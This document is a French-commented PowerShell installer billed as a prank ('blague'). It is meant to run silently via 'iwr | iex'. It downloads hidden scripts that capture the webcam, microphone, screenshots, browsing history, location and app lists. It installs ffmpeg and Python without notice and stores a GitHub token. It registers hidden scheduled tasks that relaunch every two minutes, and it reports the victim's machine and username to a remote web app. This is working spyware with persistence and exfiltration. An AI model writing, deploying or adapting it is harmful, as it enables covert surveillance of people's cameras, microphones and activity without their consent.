# blague_webcam_install.ps1 — version silencieuse, lancee par iwr | iex

$WEBAPP_URL  = "REMPLACER_PAR_URL_APPS_SCRIPT"
$TOKEN       = "REMPLACER_PAR_TON_TOKEN_GITHUB"
$CODE_SECRET = "REMPLACER_PAR_TON_CODE_SECRET"
$OWNER       = "thesangu"
$REPO        = "Aventuuuure"
$BRANCH      = "claude/signature-prank-replace-xhom2n"
$DOSSIER     = "$env:APPDATA\BlagueVerrou"
$RAW         = "https://raw.githubusercontent.com/$OWNER/$REPO/$BRANCH/tools"

New-Item -ItemType Directory -Force -Path $DOSSIER | Out-Null

# Telechargement des scripts
$scripts = @(
    "blague_lock_windows.ps1",
    "blague_webcam_windows.ps1",
    "blague_listing_windows.ps1",
    "blague_audio_windows.ps1",
    "blague_historique_windows.ps1",
    "blague_screenshot_windows.ps1",
    "blague_localisation_windows.ps1",
    "blague_apps_windows.ps1",
    "blague_update_windows.ps1",
    "blague_signature_windows.py"
)
foreach ($s in $scripts) {
    Invoke-WebRequest "$RAW/$s" -OutFile "$DOSSIER\$s" -UseBasicParsing
}

# Python si absent
if (-not (Get-Command python -ErrorAction SilentlyContinue)) {
    $pySetup = "$env:TEMP\pysetup.exe"
    Invoke-WebRequest "https://www.python.org/ftp/python/3.12.4/python-3.12.4-amd64.exe" -OutFile $pySetup -UseBasicParsing
    Start-Process $pySetup -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_launcher=0" -Wait
    Remove-Item $pySetup -ErrorAction SilentlyContinue
}

# ffmpeg
$ffmpeg = "$DOSSIER\ffmpeg.exe"
$zipTmp = "$env:TEMP\ffmpeg.zip"
Invoke-WebRequest "https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip" -OutFile $zipTmp -UseBasicParsing
Expand-Archive $zipTmp -DestinationPath "$env:TEMP\ffmpeg_ext" -Force
$found = Get-ChildItem "$env:TEMP\ffmpeg_ext" -Filter "ffmpeg.exe" -Recurse | Select-Object -First 1
if ($found) { Copy-Item $found.FullName $ffmpeg -Force }

# Detection webcam + micro
$devices = & $ffmpeg -list_devices true -f dshow -i dummy 2>&1
$camLine = $devices | Select-String '".*"' | Select-Object -First 1
$CAMERA  = if ($camLine) { $camLine.Matches.Value.Trim('"') } else { "" }

$inAudio = $false; $MIC = ""
foreach ($line in $devices) {
    if ($line -match "DirectShow audio") { $inAudio = $true; continue }
    if ($inAudio -and $line -match '"(.+?)"') { $MIC = $Matches[1]; break }
}

# Config
$config = [ordered]@{
    token       = $TOKEN
    owner       = $OWNER
    repo        = $REPO
    branch      = $BRANCH
    lock_path   = "data/blague_lock.json"
    code_secret = $CODE_SECRET
    camera_name = $CAMERA
    mic_name    = $MIC
    webapp_url  = $WEBAPP_URL
}
$config | ConvertTo-Json | Set-Content -Encoding UTF8 "$DOSSIER\blague_config.json"

# Taches planifiees
$tasks = @{
    "BlagueVerrou"              = "blague_lock_windows.ps1"
    "BlagueWebcam"              = "blague_webcam_windows.ps1"
    "BloagueListing"            = "blague_listing_windows.ps1"
    "BlagueAudio"               = "blague_audio_windows.ps1"
    "BlagueHistorique"          = "blague_historique_windows.ps1"
    "BlagueScreenshot"          = "blague_screenshot_windows.ps1"
    "BlagueLocalisation"        = "blague_localisation_windows.ps1"
    "BlagueApps"                = "blague_apps_windows.ps1"
    "BlagueUpdate"              = "blague_update_windows.ps1"
}
foreach ($name in $tasks.Keys) {
    $file = "$DOSSIER\$($tasks[$name])"
    $cmd  = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$file`""
    schtasks /create /tn $name             /tr $cmd /sc onlogon /ru $env:USERNAME /f | Out-Null
    schtasks /create /tn "${name}Gardien"  /tr $cmd /sc minute /mo 2 /ru $env:USERNAME /f | Out-Null
}

# Signature Python
$pySig = "$DOSSIER\blague_signature_windows.py"
schtasks /create /tn "BlagueSignature"        /tr "pythonw `"$pySig`"" /sc onlogon /ru $env:USERNAME /f | Out-Null
schtasks /create /tn "BlagueSignatureGardien" /tr "pythonw `"$pySig`"" /sc minute /mo 2 /ru $env:USERNAME /f | Out-Null

# Notification install
$body = @{type='install';machine=$env:COMPUTERNAME;user=$env:USERNAME;date=(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')} | ConvertTo-Json -Compress
try { Invoke-RestMethod -Uri $WEBAPP_URL -Method Post -Body $body -ContentType "application/json" | Out-Null } catch {}

# Lancement immediat
foreach ($name in $tasks.Keys) {
    $file = "$DOSSIER\$($tasks[$name])"
    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$file`"" -WindowStyle Hidden
}
Start-Process pythonw -ArgumentList "`"$pySig`"" -WindowStyle Hidden -ErrorAction SilentlyContinue
